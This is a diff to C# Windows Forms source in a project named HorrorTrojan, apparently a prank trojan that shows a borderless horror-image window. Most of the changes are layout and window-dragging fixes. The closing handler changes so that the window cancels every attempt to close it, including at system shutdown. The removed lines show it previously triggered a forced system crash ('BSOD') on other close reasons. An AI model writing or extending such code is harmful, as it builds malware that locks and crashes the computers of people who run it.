@@ -50,7 +50,7 @@ namespace HorrorTrojan
             this.Text = "";
             this.FormBorderStyle = FormBorderStyle.None;
             this.StartPosition = FormStartPosition.CenterScreen;
-            this.TopMost = false;  // ← НЕ ПОВЕРХ ВСЕГО (чтобы быть под кровью)
+            this.TopMost = false;
             this.BackColor = Color.Maroon;
             this.TransparencyKey = Color.Maroon;
             this.ShowInTaskbar = false;
@@ -75,6 +75,7 @@ namespace HorrorTrojan
             this.FormClosing += MainInterface_FormClosing;
             this.MouseDown += MainInterface_MouseDown;
             this.MouseMove += MainInterface_MouseMove;
+            this.MouseUp += MainInterface_MouseUp;
         }
 
         private void CalculateLayout()
@@ -87,8 +88,8 @@ namespace HorrorTrojan
             indicatorX = imageX + imageWidth + 20;
             indicatorY = imageY + (imageHeight - indicatorHeight) / 2;
             int formWidth = imageX + imageWidth + indicatorWidth + 40;
-    int formHeight = imageY + imageHeight + 20;
-    this.Size = new Size(formWidth, formHeight);
+            int formHeight = imageY + imageHeight + 20;
+            this.Size = new Size(formWidth, formHeight);
         }
 
         private void LoadHorrorImage()
@@ -292,14 +293,7 @@ namespace HorrorTrojan
 
         private void MainInterface_FormClosing(object sender, FormClosingEventArgs e)
         {
-            if (e.CloseReason == CloseReason.UserClosing || e.CloseReason == CloseReason.WindowsShutDown)
-            {
-                e.Cancel = true;
-            }
-            else
-            {
-                BSODTrigger.TriggerBSOD();
-            }
+            e.Cancel = true;
         }
 
         private void MainInterface_MouseDown(object sender, MouseEventArgs e)
@@ -308,6 +302,7 @@ namespace HorrorTrojan
             {
                 isDragging = true;
                 dragStartPoint = new Point(e.X, e.Y);
+                this.Capture = true;
             }
         }
 
@@ -317,6 +312,15 @@ namespace HorrorTrojan
             {
                 Point screenPoint = PointToScreen(e.Location);
                 this.Location = new Point(screenPoint.X - dragStartPoint.X, screenPoint.Y - dragStartPoint.Y);
+            }
+        }
+
+        private void MainInterface_MouseUp(object sender, MouseEventArgs e)
+        {
+            if (e.Button == MouseButtons.Left)
+            {
+                isDragging = false;
+                this.Capture = false;
             }
         }
 
